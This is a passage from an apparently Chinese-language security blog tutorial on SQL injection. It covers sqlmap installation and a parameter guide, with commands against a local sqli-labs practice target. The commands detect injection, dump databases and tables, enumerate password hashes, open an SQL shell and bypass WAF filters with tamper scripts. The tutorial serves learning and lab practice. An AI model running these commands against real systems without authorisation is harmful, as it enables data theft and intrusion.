<h3 id="Less-21-37"><a href="#Less-21-37" class="headerlink" title="Less - 21~37"></a>Less - 21~37</h3><h3 id="Less-38-53"><a href="#Less-38-53" class="headerlink" title="Less - 38~53"></a>Less - 38~53</h3><h3 id="Less-54-75"><a href="#Less-54-75" class="headerlink" title="Less - 54~75"></a>Less - 54~75</h3><h1 id="4-sqlmap"><a href="#4-sqlmap" class="headerlink" title="4 sqlmap"></a>4 sqlmap</h1><ul>
<li>官网下载地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
<li>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</li>
<li>使用方法：<code>python sqlmap.py -参数</code>，sqlmap可以运行在python2.6、2.7和3.x的任何平台上。</li>
<li>官方使用指南：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></li>
<li>官网中文README：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md">https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md</a></li>
</ul>
<h2 id="4-1-Github-README"><a href="#4-1-Github-README" class="headerlink" title="4.1 Github README"></a>4.1 Github README</h2><h3 id="4-1-1-演示截图"><a href="#4-1-1-演示截图" class="headerlink" title="4.1.1 演示截图"></a>4.1.1 演示截图</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.github.com/wiki/sqlmapproject/sqlmap/images/sqlmap_screenshot.png" alt="截图"></p>
<p>你可以查看 wiki 上的 <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Screenshots">截图</a> 了解各种用法的示例</p>
<h3 id="4-1-2-安装方法"><a href="#4-1-2-安装方法" class="headerlink" title="4.1.2 安装方法"></a>4.1.2 安装方法</h3><p>你可以点击 <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/tarball/master">这里</a> 下载最新的 <code>tar</code> 打包好的源代码，或者点击 <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/zipball/master">这里</a>下载最新的 <code>zip</code> 打包好的源代码.</p>
<p>推荐直接从 <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">Git</a> 仓库获取最新的源代码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure>

<p>sqlmap 可以运行在 <a target="_blank" rel="noopener" href="https://www.python.org/download/">Python</a>  <strong>2.6</strong>, <strong>2.7</strong>  和  <strong>3.x</strong> 版本的任何平台上</p>
<h3 id="4-1-3-使用方法"><a href="#4-1-3-使用方法" class="headerlink" title="4.1.3 使用方法"></a>4.1.3 使用方法</h3><p>通过如下命令可以查看基本的用法及命令行参数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>

<p>通过如下的命令可以查看所有的用法及命令行参数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -hh</span><br></pre></td></tr></table></figure>

<p>你可以从 <a target="_blank" rel="noopener" href="https://asciinema.org/a/46601">这里</a> 看到一个 sqlmap 的使用样例。除此以外，你还可以查看 <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">使用手册</a>。获取 sqlmap 所有支持的特性、参数、命令行选项开关及详细的使用帮助。</p>
<h3 id="4-1-4-链接"><a href="#4-1-4-链接" class="headerlink" title="4.1.4 链接"></a>4.1.4 链接</h3><ul>
<li>项目主页: <a target="_blank" rel="noopener" href="https://sqlmap.org/">https://sqlmap.org</a></li>
<li>源代码下载: <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/tarball/master">.tar.gz</a> or <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/zipball/master">.zip</a></li>
<li>Commit的 RSS 订阅: <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/commits/master.atom">https://github.com/sqlmapproject/sqlmap/commits/master.atom</a></li>
<li>问题跟踪器: <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/issues">https://github.com/sqlmapproject/sqlmap/issues</a></li>
<li>使用手册: <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki">https://github.com/sqlmapproject/sqlmap/wiki</a></li>
<li>常见问题 (FAQ): <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/FAQ">https://github.com/sqlmapproject/sqlmap/wiki/FAQ</a></li>
<li>X: <a target="_blank" rel="noopener" href="https://twitter.com/sqlmap">@sqlmap</a></li>
<li>教程: <a target="_blank" rel="noopener" href="https://www.youtube.com/user/inquisb/videos">https://www.youtube.com/user/inquisb/videos</a></li>
<li>截图: <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Screenshots">https://github.com/sqlmapproject/sqlmap/wiki/Screenshots</a></li>
</ul>
<h2 id="4-2-参数用法"><a href="#4-2-参数用法" class="headerlink" title="4.2 参数用法"></a>4.2 参数用法</h2><blockquote>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">https://blog.csdn.net/wangyuxiang946/article/details/131236510</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_56218159/article/details/117485105">https://blog.csdn.net/weixin_56218159/article/details/117485105</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaofengdada/article/details/136736627">https://blog.csdn.net/xiaofengdada/article/details/136736627</a></p>
</blockquote>
<h3 id="4-2-1-常规步骤"><a href="#4-2-1-常规步骤" class="headerlink" title="4.2.1 常规步骤"></a>4.2.1 常规步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、判断是否有注入</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1</span><br><span class="line">python sqlmap.py -u url --batch --level=3 --risk=1 --random-agent --timeout=10 --retries=1 -v 3 --threads=2 --technique=BEUSTQ</span><br><span class="line"></span><br><span class="line">2、查看所有数据库</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 --dbs</span><br><span class="line"></span><br><span class="line">3、查看当前使用的数据库</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 --current-db</span><br><span class="line"></span><br><span class="line">4、查看指定数据库的表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 -D security --tables</span><br><span class="line"></span><br><span class="line">5、查看指定库和表的列名</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 -D security -T users --columns</span><br><span class="line"></span><br><span class="line">6、查看数据值</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 -D security -T user --dump</span><br></pre></td></tr></table></figure>

<h3 id="4-2-2-常用参数"><a href="#4-2-2-常用参数" class="headerlink" title="4.2.2 常用参数"></a>4.2.2 常用参数</h3><h5 id="u-指定URL"><a href="#u-指定URL" class="headerlink" title="-u 指定URL"></a>-u 指定URL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>sqlmap不能直接扫描网站漏洞，先用其他扫描工具扫出注入点，再用sqlmap验证并利用注入点。</p>
</blockquote>
<h5 id="m-指定文件"><a href="#m-指定文件" class="headerlink" title="-m 指定文件"></a>-m 指定文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#准备一个「文件」，写上需要检测的多个url，一行一个</span><br><span class="line">python sqlmap.py -m urls.txt</span><br></pre></td></tr></table></figure>

<h5 id="r-POST请求"><a href="#r-POST请求" class="headerlink" title="-r POST请求"></a>-r POST请求</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#可以将一个post请求方式的数据包(bp抓包)保存在一个txt中，sqlmap会通过post方式检测目标。</span><br><span class="line">python sqlmap.py -r bp.txt</span><br></pre></td></tr></table></figure>

<h5 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定测试的注入点</span><br><span class="line">python sqlmap.py -u URL -p id</span><br></pre></td></tr></table></figure>

<h5 id="–batch"><a href="#–batch" class="headerlink" title="–batch"></a>–batch</h5><p>在所有需要用户输入的部分（通常是询问执行yes还是no），执行默认操作，不需要用户再输入。</p>
<h5 id="–flush-session"><a href="#–flush-session" class="headerlink" title="–flush-session"></a>–flush-session</h5><p>使用该参数表示清除当前目标的会话文件。</p>
<blockquote>
<p>sqlmap在测试某一目标URL后会生成session文件，该文件保存了测试的结果信息。当我们再次测试该目标URL时，会自动加载上一次的结果。</p>
</blockquote>
<p>当我们想重新测试该目标URL时，可以使用该参数清除当前目标的会话文件。</p>
<h5 id="–dbms"><a href="#–dbms" class="headerlink" title="–dbms"></a>–dbms</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定数据库类型</span><br><span class="line">python sqlmap.py -u URL --dbms=mysql</span><br></pre></td></tr></table></figure>

<h5 id="–level"><a href="#–level" class="headerlink" title="–level"></a>–level</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定payload测试复杂等级</span><br><span class="line">python sqlmap.py -u URL --level=3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>共有五个级别，从1-5，默认值为1。等级越高，测试的payload越复杂，当使用默认等级注入不出来时，可以尝试使用–level来提高测试等级。</p>
</blockquote>
<h5 id="–risk"><a href="#–risk" class="headerlink" title="–risk"></a>–risk</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定测试风险</span><br><span class="line">python sqlmap.py -u URL --risk=3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。</p>
</blockquote>
<h5 id="–method"><a href="#–method" class="headerlink" title="–method"></a>–method</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定是get方法还是post方法。</span><br><span class="line">--method=GET </span><br></pre></td></tr></table></figure>

<h5 id="–random-agent"><a href="#–random-agent" class="headerlink" title="–random-agent"></a>–random-agent</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#随机选择请求头中的User-Agent</span><br><span class="line">--random-agent</span><br></pre></td></tr></table></figure>

<h5 id="–user-agent"><a href="#–user-agent" class="headerlink" title="–user-agent"></a>–user-agent</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#自定义User-Agent</span><br><span class="line">python sqlmap.py -u URL --user-agent=&quot;自定义User-Agent&quot;</span><br></pre></td></tr></table></figure>

<h5 id="–proxy"><a href="#–proxy" class="headerlink" title="–proxy"></a>–proxy</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定一个代理</span><br><span class="line">--proxy=&quot;127.0.0.1:8080&quot;</span><br></pre></td></tr></table></figure>

<h5 id="–tamper"><a href="#–tamper" class="headerlink" title="–tamper"></a>–tamper</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#指定使用某些WAF绕过脚本</span><br><span class="line">python sqlmap.py -u URL --tamper &quot;space2comment&quot;</span><br></pre></td></tr></table></figure>

<p>使用方法：<code>python sqlmap.py -u URL --tamper 脚本路径1，脚本路径2...</code><br>使用–tamper参数可以在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。 sqlmap提供了部分篡改脚本，存放在sqlmap项目路径&#x2F;tamper&#x2F;文件夹中，也可以自己编写篡改脚本实现自定义的绕过。</p>
<h5 id="–technique"><a href="#–technique" class="headerlink" title="–technique"></a>–technique</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u URL --technique BE</span><br></pre></td></tr></table></figure>

<p>默认情况下，sqlmap会测试所有的注入类型。</p>
<blockquote>
<ul>
<li>B：基于布尔的盲注</li>
<li>E：基于错误</li>
<li>U：基于联合查询</li>
<li>S：堆叠查询</li>
<li>T：基于时间的盲注</li>
<li>Q：内联查询</li>
</ul>
</blockquote>
<h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据，脱库时使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-b, --banner        获取数据库管理系统的标识</span><br><span class="line">--current-user      获取数据库管理系统当前用户</span><br><span class="line">--current-db        获取数据库管理系统当前数据库</span><br><span class="line">--hostname          获取数据库服务器的主机名称（LAPTOP-2...）</span><br><span class="line">--is-dba            检测DBMS当前用户是否DBA</span><br><span class="line">--users             枚举数据库管理系统用户</span><br><span class="line">--passwords         枚举数据库管理系统用户密码哈希</span><br><span class="line">--privileges        枚举数据库管理系统用户的权限</span><br><span class="line">--dbs              枚举数据库管理系统数据库</span><br><span class="line">--tables           枚举DBMS数据库中的表</span><br><span class="line">--columns          枚举DBMS数据库表列</span><br><span class="line">-D                  要进行枚举的指定数据库名</span><br><span class="line">-T                  要进行枚举的指定表名</span><br><span class="line">-C                  要进行枚举的指定列名</span><br><span class="line">--dump             获取值，也就是表中数据</span><br><span class="line">--schema 获取字段类型</span><br><span class="line">--search           搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">--sql-query=QUERY   要执行的SQL语句</span><br><span class="line">--sql-shell         提示交互式SQL的shell</span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Shalom</div><div class="post-copyright__author_desc">Welcome!</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.shalom86012.eu.org/2024/11/07/SQL%E6%B3%A8%E5%85%A5/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.shalom86012.eu.org/2024/11/07/SQL%E6%B3%A8%E5%85%A5/')">SQL注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.shalom86012.eu.org/2024/11/07/SQL%E6%B3%A8%E5%85%A5/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.shalom86012.eu.org" target="_blank">Shalom`s Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">5</span></a><a class="post-meta__box__tags" href="/tags/web%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web安全<span class="tagsPageCount">4</span></a><a class="post-meta__box__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>SQL注入<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://img.shalom86012.eu.org/imgs/img-00000k.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/11/01/IDM%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-7p3vy9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IDM破解教程</div></div></a></div><div class="next-post pull-right"><a href="/2025/01/14/Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/img-00000k.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Log4j2漏洞复现-Vulhub</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/01/14/Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub/" title="Log4j2漏洞复现-Vulhub"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/img-00000k.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-01-14</div><div class="title">Log4j2漏洞复现-Vulhub</div></div></a></div><div><a href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-28</div><div class="title">文件上传漏洞</div></div></a></div><div><a href="/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS 跨站脚本攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/shouanren.webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-19</div><div class="title">XSS 跨站脚本攻击</div></div></a></div><div><a href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" title="如何写一篇合格的漏洞报告"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-5wr788.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-21</div><div class="title">如何写一篇合格的漏洞报告</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/emoji.webp" alt="status"/></div></div><div class="author-info__description">欢迎来到我的博客！</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Shalom</h1><div class="author-info__desc">Welcome!</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/pluviophile8" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="mailto:shalom86012@gmail.com" target="_blank" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">1 数据库基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-MySQL"><span class="toc-text">1.1 MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1.1.1 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-text">1.1.2 常见命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E9%87%8A"><span class="toc-text">1) 注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">2) 查询所有数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-text">3) 查看一个数据库里所有的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%9F%A5%E8%AF%A2%E5%BA%93%E4%B8%AD%EF%BC%88%E6%89%80%E6%9C%89%E7%9A%84%EF%BC%89%E5%AD%97%E6%AE%B5-%E5%88%97"><span class="toc-text">4) 查询库中（所有的）字段&#x2F;列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%9F%A5%E8%AF%A2%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%9A"><span class="toc-text">5) 查询表中的数据：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E9%80%89%E6%8B%A9%E7%9A%84%E6%98%AF%E5%93%AA%E4%B8%AA%E5%BA%93"><span class="toc-text">6) 查看当前选择的是哪个库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-text">7) 查看版本：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7%EF%BC%9A"><span class="toc-text">8) 查看当前登录数据库的用户：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-text">9) 查看数据存储路径：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E6%9F%A5%E7%9C%8BMySQL%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-text">10) 查看MySQL安装路径：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E6%9F%A5%E7%9C%8BMySQL%E5%AE%89%E8%A3%85%E7%9A%84%E7%B3%BB%E7%BB%9F%EF%BC%9A"><span class="toc-text">11) 查看MySQL安装的系统：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 